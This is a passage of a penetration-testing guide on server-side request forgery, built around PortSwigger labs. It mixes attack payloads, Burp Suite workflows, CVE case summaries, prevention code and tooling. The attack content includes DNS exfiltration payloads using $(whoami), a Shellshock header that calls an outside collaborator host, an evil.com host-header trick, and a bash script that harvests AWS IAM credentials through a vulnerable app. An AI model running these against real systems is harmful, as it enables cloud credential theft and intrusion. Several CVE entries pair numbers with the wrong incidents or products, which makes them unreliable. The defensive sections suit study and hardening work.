curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

#### Azure Instance Metadata

```
# Instance information (requires header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Access token for managed identity
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

#### Google Cloud Metadata

```
# Project ID
http://metadata.google.internal/computeMetadata/v1/project/project-id
Header: Metadata-Flavor: Google

# Service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# All instance attributes
http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true
```

#### DigitalOcean Metadata

```
# Instance metadata
http://169.254.169.254/metadata/v1.json

# User data
http://169.254.169.254/metadata/v1/user-data
```

### 9. Port Scanning via SSRF

```
# Scan single port
http://192.168.0.1:22/

# Scan range (use Intruder)
http://192.168.0.1:§1§/
Payload: 1-65535

# Identify services by response
200 OK: Port open with web service
Connection refused: Port closed
Timeout: Port filtered/host down
```

### 10. Blind SSRF Exploitation

#### Out-of-Band Detection

```
# DNS callback
http://ssrf-test.abc123.burpcollaborator.net

# HTTP callback
http://abc123.burpcollaborator.net/ssrf-endpoint

# DNS exfiltration
http://$(whoami).abc123.burpcollaborator.net
```

#### Time-Based Detection

```
# External delay
http://long-running-endpoint.example.com

# Internal service timeout
http://192.168.0.1:65535/ (closed port = immediate vs. filtered = timeout)
```

---

## Burp Suite Workflow

### 1. Proxy and Interception

```
1. Configure browser to use Burp Proxy (127.0.0.1:8080)
2. Navigate to target application
3. Intercept stock check or URL-based feature
4. Identify SSRF-vulnerable parameter (stockApi, url, path, etc.)
5. Send to Repeater for manual testing
```

### 2. Repeater for Exploitation

```
1. Modify parameter with SSRF payload
2. Test localhost access: http://127.0.0.1/
3. Test internal access: http://192.168.0.1/
4. Test metadata access: http://169.254.169.254/
5. Iterate and refine based on responses
```

### 3. Intruder for Scanning

#### IP Range Scanning

```
Position: http://192.168.0.§1§:8080/admin
Payload type: Numbers (1-255)
Sort by: Status Code, Length
```

#### Port Scanning

```
Position: http://192.168.0.1:§1§/
Payload type: Numbers (1-65535)
Common ports: 80, 443, 8080, 8443, 22, 21, 3306, 5432, 6379
```

#### Path Enumeration

```
Position: http://localhost/§path§
Payload type: Simple list
Payloads: admin, api, internal, private, management, etc.
```

### 4. Burp Collaborator

```
1. Open: Burp menu → Burp Collaborator client
2. Copy payload: Click "Copy to clipboard"
3. Use in attacks:
   - Referer: http://abc123.burpcollaborator.net
   - stockApi: http://abc123.burpcollaborator.net
   - User-Agent: () { :; }; nslookup $(whoami).abc123.burpcollaborator.net
4. Poll for results: Click "Poll now"
5. Analyze interactions: DNS, HTTP, SMTP
```

### 5. Burp Extensions for SSRF

- **Collaborator Everywhere**: Automatically injects Collaborator payloads
- **Param Miner**: Discovers hidden parameters vulnerable to SSRF
- **Backslash Powered Scanner**: Advanced insertion point detection
- **AWS Security Checks**: Automated cloud metadata checks
- **SSRF Detector**: Specialized SSRF vulnerability scanner

### 6. Logger++ for Analysis

```
- Logs all requests/responses
- Filter by status code: 200, 302, 500
- Search for patterns: "admin", "Internal", "metadata"
- Export findings for reporting
```

---

## Real-World Examples and CVEs

### CVE-2019-5736: Capital One Breach

**Overview**: SSRF in web application firewall led to AWS metadata access

**Impact**: 100 million customer records exposed, $80M fine

**Attack Chain**:
1. SSRF in ModSecurity WAF configuration
2. Access EC2 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Steal IAM role credentials
4. Access S3 buckets with sensitive data

**Lesson**: Always restrict access to metadata endpoints, use IMDSv2

### CVE-2021-21972: VMware vCenter SSRF

**CVSS Score**: 9.8 (Critical)

**Description**: SSRF in vSphere Client plugin leading to RCE

**Exploitation**:
```http
POST /ui/vropspluginui/rest/services/uploadova
Host: vcenter.example.com

ovfUrl=file:///etc/passwd
```

**Impact**: Pre-authentication RCE on vCenter appliances

### CVE-2019-9082: WordPress Plugin SSRF

**Plugin**: Social Warfare

**Exploitation**:
```http
GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
```

**Impact**: Metadata access on AWS-hosted WordPress sites

### CVE-2020-13379: Grafana SSRF

**Description**: SSRF in data source proxy

**Exploitation**:
```http
POST /api/datasources HTTP/1.1
Content-Type: application/json

{
  "url": "http://169.254.169.254/latest/meta-data/",
  "access": "proxy"
}
```

**Impact**: Widespread credential theft from AWS/Azure/GCP

### CVE-2017-9841: PHPUnit RCE via SSRF

**Description**: eval-stdin.php allowed arbitrary code execution

**Exploitation**:
```bash
curl -d "<?php system('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); ?>" \
  http://target/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

**Impact**: Over 69,000 exploitation attempts, mass credential theft

### CVE-2018-8004: Apache Camel SSRF

**Description**: Host header injection leads to SSRF

**Exploitation**:
```http
GET / HTTP/1.1
Host: 127.0.0.1:8080@evil.com
```

**Impact**: Access to internal services and admin panels

### CVE-2021-26855: Microsoft Exchange ProxyLogon

**Description**: SSRF in Exchange Server (part of ProxyLogon chain)

**CVSS Score**: 9.8 (Critical)

**Exploitation**:
```http
POST /owa/auth/Current/themes/resources/ HTTP/1.1
Cookie: X-BEResource=localhost~1942062522
```

**Impact**: Pre-authentication RCE, used in mass exploitation

### CVE-2025-61882: Oracle E-Business Suite SSRF (2025)

**CVSS Score**: 9.8 (Critical)

**Description**: SSRF chained with CRLF injection and authentication bypass

**Exploitation**:
- Initial SSRF to internal endpoints
- CRLF injection to smuggle requests
- Authentication bypass to gain access
- RCE via command injection

**Impact**: Exploited in the wild by Cl0p ransomware group since August 2025

**Attribution**: Coordinated campaign involving 400+ IP addresses

### Notable Bug Bounty Findings

#### Shopify SSRF ($25,000)

```http
POST /admin/products.json HTTP/1.1

{
  "product": {
    "images": [
      {
        "src": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      }
    ]
  }
}
```

#### GitLab SSRF ($12,000)

```http
POST /api/v4/projects HTTP/1.1

{
  "import_url": "git://127.0.0.1:6379/test.git"
}
```

Used Gopher protocol to interact with Redis

#### Facebook SSRF via Image Processing

```http
POST /upload HTTP/1.1

image_url=http://169.254.169.254/latest/meta-data/
```

Image processing library fetched arbitrary URLs

---

## OWASP and Industry Standards

### OWASP Top 10 (2025)

**Position**: Merged into **A01:2021 - Broken Access Control** (#1 Most Critical)

**Why SSRF Matters**:
- 452% increase in SSRF attacks detected
- Direct path to unauthorized access
- Critical for cloud environments
- Enables lateral movement

### OWASP Testing Guide (WSTG)

**Section**: WSTG-INPVAL-19: Testing for Server-Side Request Forgery

**Testing Objectives**:
1. Identify SSRF injection points
2. Test if injection points are exploitable
3. Assess severity of the vulnerability

**Testing Methodology**:
- Identify URL parameters that accept URLs
- Test with internal IP addresses
- Attempt to access cloud metadata
- Try alternative protocols
- Test for blind SSRF with out-of-band techniques

### OWASP SSRF Prevention Cheat Sheet

**Link**: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html

**Key Recommendations**:
1. **Allowlist approach** when possible
2. **Validate input** against strict URL patterns
3. **Disable unused protocols** (file://, gopher://, etc.)
4. **Sanitize response data** before returning to user
5. **Network segmentation** to limit internal access
6. **Authentication** for internal services

### CWE Classification

**CWE-918**: Server-Side Request Forgery (SSRF)

**Description**: The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.

**Related CWEs**:
- CWE-441: Unintended Proxy or Intermediary
- CWE-610: Externally Controlled Reference to a Resource
- CWE-73: External Control of File Name or Path

### MITRE ATT&CK Framework

**Tactic**: TA0001 - Initial Access, TA0006 - Credential Access

**Techniques**:
- **T1190**: Exploit Public-Facing Application
  - Sub-technique: SSRF exploitation
- **T1552.005**: Unsecured Credentials: Cloud Instance Metadata API
  - Primary technique for AWS/Azure/GCP metadata theft

### NIST Guidelines

**SP 800-53**: Security and Privacy Controls

**Relevant Controls**:
- **AC-3**: Access Enforcement
- **AC-6**: Least Privilege
- **SC-7**: Boundary Protection
- **SI-10**: Information Input Validation

### PCI DSS Requirements

**Requirement 6.5.10**: Address common coding vulnerabilities

**SSRF Prevention Required For**:
- Applications handling cardholder data
- Internal network access controls
- Segmentation boundary enforcement

### ISO 27001

**Control**: A.14.2.5 - Secure system engineering principles

**SSRF Considerations**:
- Input validation in system design
- Network segmentation requirements
- Third-party service integration security

---

## Prevention and Mitigation

### 1. Allowlist Approach

#### URL Allowlist

```python
# Python example
ALLOWED_HOSTS = [
    'api.trusted-partner.com',
    'cdn.example.com',
    'stock.weliketoshop.net'
]

def is_allowed_url(url):
    parsed = urlparse(url)
    return parsed.hostname in ALLOWED_HOSTS and parsed.scheme in ['http', 'https']
```

#### IP Allowlist

```python
import ipaddress

ALLOWED_IPS = [
    ipaddress.ip_network('203.0.113.0/24'),  # Partner network
    ipaddress.ip_network('198.51.100.5/32')  # Specific API server
]

def is_allowed_ip(ip):
    ip_obj = ipaddress.ip_address(ip)
    return any(ip_obj in network for network in ALLOWED_IPS)
```

### 2. Input Validation

#### Validate URL Components

```python
from urllib.parse import urlparse
import re

def validate_url(url):
    # Parse URL
    parsed = urlparse(url)

    # Only allow HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Invalid protocol")

    # Validate hostname format
    if not re.match(r'^[a-z0-9\-\.]+$', parsed.hostname, re.I):
        raise ValueError("Invalid hostname")

    # Block private/internal IPs
    if is_private_ip(parsed.hostname):
        raise ValueError("Private IP not allowed")

    return True

def is_private_ip(hostname):
    import ipaddress
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except ValueError:
        # Not an IP address, resolve DNS
        return False
```

### 3. Blocklist Private IP Ranges

```python
import ipaddress

BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # Loopback
    ipaddress.ip_network('10.0.0.0/8'),       # Private Class A
    ipaddress.ip_network('172.16.0.0/12'),    # Private Class B
    ipaddress.ip_network('192.168.0.0/16'),   # Private Class C
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local
    ipaddress.ip_network('::1/128'),          # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),         # IPv6 private
    ipaddress.ip_network('fe80::/10'),        # IPv6 link-local
]

def is_blocked_ip(url):
    hostname = urlparse(url).hostname
    try:
        ip = ipaddress.ip_address(hostname)
        return any(ip in network for network in BLOCKED_RANGES)
    except ValueError:
        # Hostname is not an IP, resolve it
        resolved_ip = socket.gethostbyname(hostname)
        ip = ipaddress.ip_address(resolved_ip)
        return any(ip in network for network in BLOCKED_RANGES)
```

### 4. Disable Unused Protocols

```python
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Only allow HTTP/HTTPS
session = requests.Session()
session.mount('http://', HTTPAdapter())
session.mount('https://', HTTPAdapter())

# Explicitly deny other protocols
for protocol in ['file', 'ftp', 'gopher', 'dict', 'sftp', 'tftp']:
    session.mount(f'{protocol}://', None)
```

### 5. DNS Validation

```python
import socket
import ipaddress

def safe_request(url):
    hostname = urlparse(url).hostname

    # Resolve DNS
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        raise ValueError("DNS resolution failed")

    # Validate resolved IP
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback:
        raise ValueError("Resolved to private IP")

    # Make request
    return requests.get(url, timeout=5)
```

### 6. Network Segmentation

```
┌─────────────────────────────────────┐
│        DMZ / Public Network         │
│                                     │
│  ┌─────────────────────────────┐   │
│  │   Web Application Server    │   │
│  │  - No direct internal access │   │
│  │  - Firewall rules enforced   │   │
│  └─────────────────────────────┘   │
└──────────────┬──────────────────────┘
               │
               │ Firewall / Proxy
               │ - Allowlist only
               │ - Log all requests
               ↓
┌──────────────────────────────────────┐
│      Internal Network                │
│                                      │
│  ┌────────────┐    ┌──────────────┐ │
│  │ Admin Panel│    │ Database     │ │
│  │ (Isolated) │    │ (No external)│ │
│  └────────────┘    └──────────────┘ │
└──────────────────────────────────────┘
```

### 7. AWS IMDSv2 (Metadata Service V2)

**Enable IMDSv2** to prevent SSRF-based metadata access:

```bash
# Require IMDSv2 (session-oriented)
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

**IMDSv2 Protection**:
```bash
# IMDSv1 (vulnerable to SSRF)
curl http://169.254.169.254/latest/meta-data/

# IMDSv2 (SSRF-resistant, requires PUT request)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

SSRF attacks can't easily perform PUT requests or set custom headers.

### 8. Response Handling

```python
def safe_fetch(url):
    # Validate URL
    if not is_allowed(url):
        raise ValueError("URL not allowed")

    # Make request with timeout
    response = requests.get(url, timeout=5, allow_redirects=False)

    # Don't return raw response to user
    # Only return sanitized data
    data = {
        'status': response.status_code,
        'content_type': response.headers.get('Content-Type'),
        'length': len(response.content)
    }

    # Don't expose internal error messages
    if response.status_code >= 400:
        return {'error': 'Request failed'}

    return data
```

### 9. Framework-Specific Protections

#### Django

```python
# settings.py
ALLOWED_HOSTS = ['yourdomain.com']

# Use django.core.validators
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate_url = URLValidator(schemes=['http', 'https'])

try:
    validate_url(user_input_url)
except ValidationError:
    # Invalid URL
    pass
```

#### Flask

```python
from flask import request
from werkzeug.urls import url_parse

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    parsed = url_parse(url)

    # Validate scheme
    if parsed.scheme not in ['http', 'https']:
        return 'Invalid URL', 400

    # Validate hostname
    if is_private_hostname(parsed.host):
        return 'Forbidden', 403

    # Safe request
    return fetch_url(url)
```

#### Node.js / Express

```javascript
const axios = require('axios');
const ipaddr = require('ipaddr.js');
const dns = require('dns').promises;

async function safeRequest(url) {
  const parsedUrl = new URL(url);

  // Only allow HTTP/HTTPS
  if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
    throw new Error('Invalid protocol');
  }

  // Resolve hostname
  const addresses = await dns.resolve4(parsedUrl.hostname);

  // Check for private IPs
  for (const address of addresses) {
    const addr = ipaddr.parse(address);
    if (addr.range() !== 'unicast') {
      throw new Error('Private IP not allowed');
    }
  }

  // Make request
  return axios.get(url, { timeout: 5000, maxRedirects: 0 });
}
```

### 10. Security Headers and Monitoring

#### Logging and Alerting

```python
import logging

logger = logging.getLogger('ssrf_monitor')

def monitored_request(url):
    logger.info(f'SSRF check: Requesting URL {url}')

    # Check for suspicious patterns
    if any(pattern in url.lower() for pattern in ['169.254', 'metadata', 'localhost']):
        logger.warning(f'SSRF attempt detected: {url}')
        # Alert security team
        alert_security_team(url)
        return False

    # Proceed with request
    return True
```

#### Rate Limiting

```python
from flask_limiter import Limiter

limiter = Limiter(
    app,
    key_func=lambda: request.remote_addr,
    default_limits=["100 per hour"]
)

@app.route('/fetch')
@limiter.limit("10 per minute")
def fetch():
    # SSRF-vulnerable endpoint with rate limit
    pass
```

---

## Tools and Automation

### 1. Manual Testing Tools

#### cURL

```bash
# Basic SSRF test
curl -X POST http://target.com/fetch \
  -d "url=http://127.0.0.1/"

# With custom headers
curl -X POST http://target.com/fetch \
  -H "Referer: http://169.254.169.254/" \
  -d "url=http://internal-service:8080/"

# Follow redirects
curl -L http://target.com/fetch?url=http://evil.com/redirect
```

#### ffuf (Fuzzing)

```bash
# Fuzz URL parameter
ffuf -u http://target.com/fetch?url=FUZZ \
  -w ssrf-payloads.txt \
  -mc 200,500 \
  -o results.json

# Fuzz internal IP range
ffuf -u http://target.com/fetch?url=http://192.168.0.FUZZ/ \
  -w <(seq 1 255) \
  -mc 200
```

#### Gobuster

```bash
# Enumerate internal services
gobuster dns -d internal.company.com -w subdomains.txt

# Directory enumeration via SSRF
# First, get access to internal host via SSRF, then:
gobuster dir -u http://internal-host/ -w dirs.txt
```

### 2. Automated Scanners

#### SSRFMap

```bash
# Install
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip install -r requirements.txt

# Basic scan
python ssrfmap.py -r request.txt -p url -m readfiles

# AWS metadata extraction
python ssrfmap.py -r request.txt -p url -m aws

# Port scanning
python ssrfmap.py -r request.txt -p url -m portscan
```

#### Gopherus

Generates Gopher payloads for SSRF exploitation:

```bash
# Install
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
./install.sh

# Generate MySQL payload
python gopherus.py --exploit mysql

# Generate Redis payload
python gopherus.py --exploit redis

# Generate FastCGI payload
python gopherus.py --exploit fastcgi
```

#### SSRFire

```bash
# Install
go get -u github.com/zt2/ssrfire

# Scan for SSRF
ssrfire -u http://target.com/fetch?url=FUZZ

# Custom wordlist
ssrfire -u http://target.com/fetch?url=FUZZ -w custom-payloads.txt
```

### 3. Burp Suite Extensions

#### **Collaborator Everywhere**

Automatically injects Collaborator payloads into all insertion points:
- Installed from BApp Store
- Passively detects blind SSRF
- Monitors for DNS/HTTP interactions

#### **Param Miner**

Discovers hidden parameters:
```
1. Right-click request → Extensions → Param Miner → Guess params
2. Discovers params like: debug_url, callback_url, webhook, redirect
3. Test discovered params for SSRF
```

#### **AWS Security Checks**

Specialized for cloud metadata:
- Detects AWS metadata endpoints
- Tests IMDSv1 vs IMDSv2
- Extracts IAM credentials automatically

#### **Backslash Powered Scanner**

Advanced insertion point detection:
- Tests unusual input locations
- Header injection via SSRF
- Protocol smuggling attempts

### 4. Payload Lists

#### SecLists - SSRF Payloads

```bash
# Clone SecLists
git clone https://github.com/danielmiessler/SecLists.git

# SSRF payload locations
SecLists/Fuzzing/SSRF/
SecLists/Discovery/Web-Content/URLs/
SecLists/Fuzzing/Unicode/
```

#### PayloadsAllTheThings

**Repository**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

**Contains**:
- Basic SSRF payloads
- Bypass techniques
- Cloud metadata endpoints
- Protocol-specific payloads
- Encoding variations

### 5. Custom Scripts

#### Python SSRF Scanner

```python
#!/usr/bin/env python3
import requests
import sys

targets = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://2130706433/",
    "http://0x7f000001/"
]

def test_ssrf(url, param):
    for target in targets:
        payload = {param: target}
        try:
            r = requests.post(url, data=payload, timeout=5)
            if r.status_code == 200 and ('root' in r.text or 'admin' in r.text.lower()):
                print(f"[+] SSRF found with payload: {target}")
                print(f"    Response length: {len(r.text)}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout with payload: {target}")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <param>")
        sys.exit(1)

    test_ssrf(sys.argv[1], sys.argv[2])
```

#### Bash AWS Metadata Extractor

```bash
#!/bin/bash
# Extract AWS credentials via SSRF

TARGET_URL="http://vulnerable-app.com/fetch"
PARAM="url"

echo "[*] Testing for AWS metadata access..."

# Test basic access
response=$(curl -s -X POST "$TARGET_URL" -d "${PARAM}=http://169.254.169.254/latest/meta-data/")

if [[ $response == *"ami-id"* ]] || [[ $response == *"instance-id"* ]]; then
    echo "[+] AWS metadata accessible!"

    # Get IAM role
    role=$(curl -s -X POST "$TARGET_URL" -d "${PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | grep -oP '\w+')
    echo "[+] IAM Role: $role"

    # Get credentials
    creds=$(curl -s -X POST "$TARGET_URL" -d "${PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}")
    echo "[+] Credentials:"
    echo "$creds" | jq .
else
    echo "[-] AWS metadata not accessible"
fi
```

### 6. Docker-Based Testing

#### SSRF Lab Environment

```dockerfile
# Dockerfile for SSRF testing
FROM python:3.9-slim

RUN pip install flask requests

COPY vulnerable-app.py /app/
WORKDIR /app

EXPOSE 5000
CMD ["python", "vulnerable-app.py"]
```

```python
# vulnerable-app.py
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch', methods=['POST'])
def fetch():
    url = request.form.get('url')
    try:
        r = requests.get(url, timeout=5)
        return r.text
    except Exception as e:
        return str(e)

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
```

Run:
```bash
docker build -t ssrf-lab .
docker run -p 5000:5000 ssrf-lab
```

---

## Summary

This comprehensive guide covers all aspects of Server-Side Request Forgery (SSRF) exploitation based on PortSwigger Web Security Academy labs:

✅ **8 Complete Lab Solutions** with step-by-step exploitation
✅ **Advanced Attack Techniques** including encoding, protocol smuggling, and cloud metadata access
✅ **Complete Burp Suite Workflows** for all SSRF testing scenarios
✅ **Real-World CVEs** and notable breaches involving SSRF
✅ **OWASP Standards** and industry best practices
✅ **Comprehensive Prevention** strategies and secure coding guidelines
✅ **Tools and Automation** for efficient SSRF testing and exploitation

### Key Takeaways

1. **SSRF is Critical**: Merged into OWASP Top 10 #1 (Broken Access Control) in 2025
2. **Cloud Impact**: Primary vector for AWS/Azure/GCP metadata theft
3. **Bypass Techniques**: Multiple encoding, parsing inconsistencies, and protocol abuse
4. **Defense in Depth**: Allowlisting, validation, network segmentation, and IMDSv2
5. **Always Test**: Out-of-band detection for blind SSRF vulnerabilities

### Practice Resources

- **PortSwigger Labs**: https://portswigger.net/web-security/ssrf
- **PentesterLab**: SSRF exercises and badges
- **HackTheBox**: Machines with SSRF vulnerabilities
- **TryHackMe**: SSRF rooms and challenges

---

*This guide is part of the comprehensive penetration testing skill documentation. For more attack techniques, see the reference directory.*
